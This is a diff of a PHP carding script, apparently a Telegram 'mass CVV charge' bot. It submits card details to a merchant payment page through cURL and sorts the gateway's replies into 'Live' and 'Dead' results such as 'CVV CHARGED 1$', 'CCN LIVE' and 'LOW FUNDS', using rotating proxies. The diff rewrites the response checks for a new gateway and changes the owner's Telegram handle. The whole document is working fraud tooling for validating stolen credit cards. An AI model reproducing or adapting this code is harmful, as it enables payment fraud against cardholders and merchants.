@@ -76,129 +76,44 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-$result2a = curl_exec($ch);
-
-$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
+$result2 = curl_exec($ch);
 
 curl_close($ch);
 
-if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
-      $status = "Live 🟡";
-      $response = "Zip Mismatch ❎";
-    }
-
-
-elseif (strpos($result2a, "CVV LIVE")){
+if (strpos($result2, "Thank you for your message.")){
   $status = "Live 🟢";
-$response = "CVV Matched ✅";
-  }
-elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
-  $status = "CVV Live 🟢";
-$response = "INSUFFICIENT FUNDS ✅";
-
-  }
-elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
-  $status = "Live 🟡";
-$response = "CCN Live ❎";
-
-  }
-elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
-  $status = "Live 🟡";
-$response = "TRANSACTION NOT ALLOWED";
-
-  }
-
-elseif (strpos($result2a, "DO NOT HONOR")){
-  
-$status = "Dead 🔴";
-$response = "DO NOT HONOR 🚫";
+$response = "CVV CHARGED 1$ 🔥";
 }
 
-elseif (strpos($result2a, "stolen_card")){
-  
-$status = "Dead 🔴";
-$response = "Stolen Card 🚫";
-}
-
-elseif (strpos($result2a, "lost_card")){
-  $status = "Dead 🔴";
-$response = "Lost Card 🚫";
-}
-
-
-elseif (strpos($result2a, "PICKUP CARD")){
-  $status = "Dead 🔴";
-$response = "PICKUP CARD";
-}
-
-
-elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
-  
-  $status = "Dead 🔴";
-$response = "Incorrect Card Number 🚫";
-}
-
-
-elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
-  $status = "Dead 🔴";
-$response = "Expired Card 🚫";
-
-  }
-
-
-elseif (strpos($result2a, '"status":"success"')){
+elseif (strpos($result2, "security code is incorrect")){
   $status = "Live 🟢";
-$response = "Charged 1$";
-
-  }
-
-
-elseif (strpos($result2a, "FRAUDULENT")){
-  $status = "Dead 🔴";
-$response = "Fraudulent 🚫";
+$response = "CCN LIVE ✅";
 }
 
-
-elseif (strpos($result2a, "lock_timeout")){
-  $status = "Dead 🔴";
-$response = "error 404 🚫";
+elseif (strpos($result2, "security code is invalid")){
+  $status = "Live 🟢";
+$response = "CCN LIVE ✅";
 }
 
-
-elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
-  $status = "Dead 🔴";
-$response = "Generic Decline 🚫";
+elseif (strpos($result2, "insufficient funds")){
+  $status = "Live 🟢";
+$response = "LOW FUNDS ✅";
 }
 
-
-elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
-  $status = "Dead 🔴";
-$response = "NVAILD EXPIRY MONTH 😥";
+elseif (strpos($result2, "not support")){
+  $status = "Live 🟢";
+$response = "CVV LIVE ✅";
 }
 
-
-
-elseif (strpos($result2a, "Error processing payment")){
+elseif (strpos($result2, "Your card was declined.")){
   $status = "Dead 🔴";
-$response = "Error processing payment";
-}
-
-elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
-  $status = "Live 🟡";
-$response = "CARD NOT SUPPORTED 🚫";
-}
-
-
-elseif (strpos($result2a, "parameter_invalid_empty")){
-  $status = "Dead 🔴";
-$response = "404 error 🚫";
+$response = "GENERIC DECLINED ⭕";
 }
 
 else {
       $status = "Dead 🔴";
-$response = "";
+$response = "ERROR ❗";
 
-    }
 //--------SMS SENT SECTION----------------//
   global $mes_id, $chatId , $fullmes;
 $mainulstatus = "<b>Dead 🔴</b>";
@@ -211,7 +126,7 @@ $umass = "<b>𒀭  MASS CVV CHARGE 1 $  𒀭
 ";
 $fmass = "<b>╭───────────────
 𒆜 PROXY  : [ LIVE & ROTATING ]
-𒆜 BOT BY : <a href='t.me/ownerb3'>[ BE - OWNER  ]</a>
+𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
 ╰───────────────✘</b>";
 
 $mallmsg = urlencode ("$umass
